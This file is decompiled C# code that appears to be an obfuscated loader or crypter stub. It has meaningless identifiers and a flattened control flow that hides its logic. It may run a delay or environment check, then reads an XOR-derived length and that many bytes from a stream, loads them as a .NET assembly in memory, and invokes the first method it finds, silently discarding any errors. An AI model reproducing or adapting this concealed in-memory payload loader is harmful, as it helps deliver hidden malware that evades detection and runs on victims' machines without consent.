using System;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

internal class Class3
{
	private static CultureInfo cultureInfo_0 = CultureInfo.InvariantCulture;

	private Class1 class1_0 = new Class1(cultureInfo_0, bool_0: true);

	private byte[] byte_0;

	private Assembly assembly_0;

	[CompilerGenerated]
	private static bool bool_0;

	[CompilerGenerated]
	private static int int_0;

	public static bool aYFeabfhbJgItbtDsYpKHJvsaSFb
	{
		[CompilerGenerated]
		get
		{
			return bool_0;
		}
		[CompilerGenerated]
		set
		{
			bool_0 = value;
		}
	}

	public static int LpGcuZilcOGhVrISHhxImJzhCqvB
	{
		[CompilerGenerated]
		get
		{
			return int_0;
		}
		[CompilerGenerated]
		set
		{
			int_0 = value;
		}
	}

	public Class3()
	{
		if (aYFeabfhbJgItbtDsYpKHJvsaSFb && new Class2(LpGcuZilcOGhVrISHhxImJzhCqvB).method_1(300000, (ulong)LpGcuZilcOGhVrISHhxImJzhCqvB))
		{
			return;
		}
		Class1.Delegate0 delegate0_ = delegate(Stream stream_0)
		{
			stream_0.Seek(1L, SeekOrigin.Begin);
			byte[] byte_3 = default(byte[]);
			byte[] byte_ = default(byte[]);
			while (true)
			{
				int num = 2018154486;
				while (true)
				{
					int num2 = num;
					uint num3;
					switch ((num3 = (uint)(~(-num2) * -1008859991 + -536096128 - 1762566505)) % 5u)
					{
					case 3u:
						stream_0.Read(byte_3, 0, 4);
						stream_0.Seek(5L, SeekOrigin.Begin);
						num = ((int)num3 * -955692295) ^ -2095318605;
						continue;
					case 1u:
						byte_3 = new byte[4];
						num = ((int)num3 * -459665680) ^ -1981824976;
						continue;
					case 0u:
					{
						byte[] byte_2 = new byte[4];
						stream_0.Read(byte_2, 0, 4);
						byte_ = null;
						method_0(ref byte_3, ref byte_2, ref byte_);
						num = ((int)num3 * -2128035186) ^ -1437146173;
						continue;
					}
					case 4u:
						break;
					default:
						stream_0.Read(byte_, 0, byte_.Length);
						return byte_;
					}
					break;
				}
			}
		};
		byte_0 = class1_0.method_1(delegate0_);
	}

	private int method_0(ref byte[] byte_1, ref byte[] byte_2, ref byte[] byte_3)
	{
		int num = byte_1[0] | (byte_1[1] << 8) | (byte_1[2] << 16) | (byte_1[3] << 24);
		num ^= byte_2[0] | (byte_2[1] << 8) | (byte_2[2] << 16) | (byte_2[3] << 24);
		while (true)
		{
			int num2 = 852855306;
			while (true)
			{
				int num3 = num2;
				uint num4;
				switch ((num4 = (uint)(~((1866481887 - num3) * -1334001075) * 1158182319 - -1638983353)) % 3u)
				{
				case 1u:
					goto IL_003c;
				case 0u:
					break;
				default:
					return num;
				}
				break;
				IL_003c:
				byte_3 = new byte[num];
				num2 = (int)((num4 * 1092582351) ^ 0x4371E35D);
			}
		}
	}

	private bool method_1(byte[] byte_1)
	{
		try
		{
			assembly_0 = AppDomain.CurrentDomain.Load(byte_1);
			Type type = assembly_0.GetTypes()[0];
			NewLateBinding.LateCall((object)null, type, type.GetMethods()[0].Name, new object[0], (string[])null, (Type[])null, (bool[])null, true);
			return true;
		}
		catch
		{
			return false;
		}
	}

	public bool method_2()
	{
		return method_1(byte_0);
	}

	[CompilerGenerated]
	private byte[] method_3(Stream stream_0)
	{
		stream_0.Seek(1L, SeekOrigin.Begin);
		byte[] byte_3 = default(byte[]);
		byte[] byte_ = default(byte[]);
		while (true)
		{
			int num = 2018154486;
			while (true)
			{
				int num2 = num;
				uint num3;
				switch ((num3 = (uint)(~(-num2) * -1008859991 + -536096128 - 1762566505)) % 5u)
				{
				case 3u:
					stream_0.Read(byte_3, 0, 4);
					stream_0.Seek(5L, SeekOrigin.Begin);
					num = ((int)num3 * -955692295) ^ -2095318605;
					continue;
				case 1u:
					byte_3 = new byte[4];
					num = ((int)num3 * -459665680) ^ -1981824976;
					continue;
				case 0u:
				{
					byte[] byte_2 = new byte[4];
					stream_0.Read(byte_2, 0, 4);
					byte_ = null;
					method_0(ref byte_3, ref byte_2, ref byte_);
					num = ((int)num3 * -2128035186) ^ -1437146173;
					continue;
				}
				case 4u:
					break;
				default:
					stream_0.Read(byte_, 0, byte_.Length);
					return byte_;
				}
				break;
			}
		}
	}
}
